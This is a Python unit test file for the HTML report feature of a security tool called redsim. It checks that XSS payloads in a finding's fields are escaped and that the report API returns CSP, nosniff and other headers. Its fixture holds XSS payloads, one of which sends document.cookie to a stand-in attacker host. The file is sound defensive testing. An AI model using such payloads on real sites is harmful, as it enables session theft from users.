"""Phase 4 v0.4.0 F14d — HTML report XSS defence + CSP.

The renderer escapes every finding interpolation; the API response
adds a strict CSP and ``X-Content-Type-Options: nosniff``. An injected
``<script>alert(1)</script>`` payload in a finding's title or
description is escaped at render time and would be blocked at the
browser by CSP if it ever reached the document.
"""

from __future__ import annotations

import os
import tempfile
import unittest
from pathlib import Path
from unittest.mock import patch

import pytest

pytest.importorskip("fastapi")
pytest.importorskip("httpx")
pytest.importorskip("sqlalchemy")

from fastapi.testclient import TestClient

from redsim.api.app import create_app
from redsim.api.auth import CurrentUser, get_current_user
from redsim.api.security_headers import REPORT_CSP
from redsim.api.settings import APISettings
from redsim.report import generate_html_report
from redsim.schema import RedsimFinding
from redsim.state import RunState


def _malicious_finding() -> RedsimFinding:
    return RedsimFinding(
        id="vuln-xss-1",
        title="<script>alert('title')</script> SQL Injection",
        severity="critical",
        finding_type="dast",
        description="Vulnerable to `<img src=x onerror=alert('desc')>` in evidence.",
        impact="<script>fetch('//attacker.example.com/?'+document.cookie)</script>",
        source_tool="strix", source_run_id="run-xss",
        affected_component="<svg/onload=alert(1)>",
        confidence="high", status="open",
        created_at="2026", updated_at="2026",
    )


class TestRendererEscapes(unittest.TestCase):
    def test_injected_script_tag_does_not_appear_raw(self):
        with tempfile.TemporaryDirectory() as tmp:
            state = RunState(tmp, "run-xss")
            html = generate_html_report(state, [_malicious_finding()])
        # The actual payload markers must NOT survive as live HTML.
        self.assertNotIn("<script>alert", html)
        self.assertNotIn("<img src=x onerror", html)
        self.assertNotIn("<svg/onload", html)
        # And they ARE present as escaped entities so the user can
        # still read what was reported.
        self.assertIn("&lt;script&gt;", html)


class TestReportResponseHeaders(unittest.TestCase):
    """The /v1/runs/{id}/report.html response carries strict CSP + nosniff."""

    def _build_app_with_run(self, tmp: Path):
        import contextlib

        from sqlalchemy import create_engine
        from sqlalchemy.dialects.postgresql import JSONB
        from sqlalchemy.ext.compiler import compiles
        from sqlalchemy.orm import sessionmaker
        from sqlalchemy.pool import StaticPool

        @compiles(JSONB, "sqlite")
        def _to_text(t, c, **kw):  # noqa: ARG001
            return "TEXT"

        from redsim.db.models import Base, Organization, Project, Run

        engine = create_engine(
            "sqlite://", future=True,
            connect_args={"check_same_thread": False},
            poolclass=StaticPool,
        )
        Base.metadata.create_all(bind=engine)
        Session = sessionmaker(engine, expire_on_commit=False)
        with Session() as s:
            s.add(Organization(id="org-1", name="A", slug="a"))
            s.add(Project(id="proj-a", org_id="org-1", name="P", slug="proj-a"))
            s.add(Run(id="run-xss", project_id="proj-a", mode="api",
                      status="succeeded", stage_table={}))
            s.commit()

        # Pre-render a real report.html that contains the payload.
        run_dir = tmp / "runs" / "run-xss"
        run_dir.mkdir(parents=True, exist_ok=True)
        state = RunState(str(tmp), "run-xss")
        html = generate_html_report(state, [_malicious_finding()])
        (run_dir / "report.html").write_text(html)

        @contextlib.contextmanager
        def session_cm():
            sess = Session()
            try:
                yield sess
                sess.commit()
            finally:
                sess.close()

        settings = APISettings(env="dev", auth_mode="dev",
                                cors_origins=["http://localhost:3000"])
        return create_app(settings), session_cm

    def test_html_response_carries_csp_and_nosniff(self):
        with tempfile.TemporaryDirectory() as tmp:
            app, session_cm = self._build_app_with_run(Path(tmp))
            app.dependency_overrides[get_current_user] = lambda: CurrentUser(
                sub="u-1", email="a@x",
                project_memberships={"proj-a": "admin"},
            )
            client = TestClient(app)
            from redsim.config import RedsimConfig
            cfg = RedsimConfig(output_dir=tmp)
            with patch("redsim.api.v1.reports.load_config", return_value=cfg), \
                 patch.dict(os.environ,
                            {"REDSIM_ENV": "dev",
                             "REDSIM_AUTH_MODE": "dev"},
                            clear=False), \
                 patch("redsim.db.session.get_session", session_cm):
                resp = client.get("/v1/runs/run-xss/report.html")

        self.assertEqual(resp.status_code, 200)
        self.assertEqual(resp.headers["content-security-policy"], REPORT_CSP)
        self.assertEqual(resp.headers["x-content-type-options"], "nosniff")
        self.assertEqual(resp.headers["referrer-policy"], "no-referrer")
        self.assertEqual(resp.headers["x-frame-options"], "DENY")
        self.assertEqual(resp.headers["content-disposition"], "inline")
        # The body is HTML and does not carry an executable <script>.
        body = resp.text
        self.assertIn("&lt;script&gt;", body)
        self.assertNotIn("<script>alert", body)

    def test_json_response_carries_nosniff_and_attachment(self):
        with tempfile.TemporaryDirectory() as tmp:
            # Write a JSON report alongside.
            run_dir = Path(tmp) / "runs" / "run-xss"
            run_dir.mkdir(parents=True, exist_ok=True)
            (run_dir / "report.json").write_text('{"findings": []}')

            app, session_cm = self._build_app_with_run(Path(tmp))
            app.dependency_overrides[get_current_user] = lambda: CurrentUser(
                sub="u-1", email="a@x",
                project_memberships={"proj-a": "admin"},
            )
            client = TestClient(app)
            from redsim.config import RedsimConfig
            cfg = RedsimConfig(output_dir=tmp)
            with patch("redsim.api.v1.reports.load_config", return_value=cfg), \
                 patch("redsim.db.session.get_session", session_cm):
                resp = client.get("/v1/runs/run-xss/report.json")

        self.assertEqual(resp.status_code, 200)
        self.assertEqual(resp.headers["x-content-type-options"], "nosniff")
        self.assertIn("attachment", resp.headers["content-disposition"])
        self.assertIn("redsim-run-xss-report.json",
                      resp.headers["content-disposition"])


if __name__ == "__main__":
    unittest.main()
